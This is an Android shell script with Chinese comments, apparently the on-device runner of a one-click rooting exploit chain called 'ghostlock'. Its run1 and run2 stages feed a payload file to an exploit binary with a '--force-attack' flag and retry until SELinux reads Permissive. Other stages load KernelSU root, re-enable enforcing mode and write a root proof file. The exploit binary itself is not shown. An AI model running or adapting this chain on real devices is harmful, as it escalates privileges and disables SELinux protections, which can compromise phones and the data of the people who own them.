#!/system/bin/sh
# 设备端执行器 —— 由 pc/root_oneclick.cmd 推到 /data/local/tmp/glpc/glpc.sh
#
# 为什么要落成脚本再执行：adb shell 直接带引号/重定向的长命令在 Windows 下会被
# 各种转义规则吃掉（仓库 README 里的同一个坑）。本地写文件 → push → adb shell sh
# 执行，是最不容易出错的形式。
#
# 用法: sh glpc.sh <stage> [args]
#   run1    只打 W1（GL_STOP_AFTER_W1），退出码写进日志
#   run2    打 W2/W3（此时 SELinux 已 permissive，W1 自动跳过）
#   tail <f>  打印日志尾部
#   state   打印当前身份/SELinux/模块状态
set -u
D=/data/local/tmp/glpc

case "${1:-}" in
  run1|run2)
    cd "$D" || exit 9
    L="$D/$1.log"
    rm -f "$L"
    # 不套 secwrap：adb shell 本来就没有 seccomp 过滤器，W3 那一段会自动跳过，
    # 而套上之后 W3 会动 seccomp 状态，root 子进程接着 exec 脚本会拿到 EFAULT
    # （实测 execl ... errno=14，脚本根本没跑起来，KSU 也就没加载）。
    if [ "$1" = "run1" ]; then
      # W1 单把命中率约 50%，打空时 selinux_state 一个字节没变，重来是干净的。
      n=0
      while [ "$n" -lt 3 ]; do
        n=$((n + 1))
        GL_STOP_AFTER_W1=1 ./glbin --ghostlock-app-call --force-attack < payload_run.bin >> "$L" 2>&1
        echo "--- pass $n rc=$? enforce=$(getenforce 2>/dev/null) ---" >> "$L"
        [ "$(getenforce 2>/dev/null)" = "Permissive" ] && break
      done
    else
      ./glbin --ghostlock-app-call --force-attack < payload_run.bin > "$L" 2>&1
    fi
    echo "rc=$?" >> "$L"
    ;;
  tail)
    tail -n "${3:-12}" "$2" 2>/dev/null
    ;;
  harden)
    # 收尾：root 已经由模块在策略内提供，不再需要 Permissive
    su -c 'echo 1 > /sys/fs/selinux/enforce'
    echo "enforce=$(getenforce 2>/dev/null)"
    ;;
  proof)
    su -c 'mkdir -p /data/local/tmp/rootproof; echo ok > /data/local/tmp/rootproof/proof.txt;            id; ls -l /data/local/tmp/rootproof/proof.txt'
    ;;
  state)
    echo "uid_shell=$(id -u)"
    echo "enforce=$(getenforce 2>/dev/null)"
    echo "su=$(su -c id 2>/dev/null)"
    echo "module=$(grep kernelsu /proc/modules 2>/dev/null)"
    ;;
  *)
    echo "usage: sh glpc.sh run1|run2|tail <file> [n]|state"
    exit 2
    ;;
esac
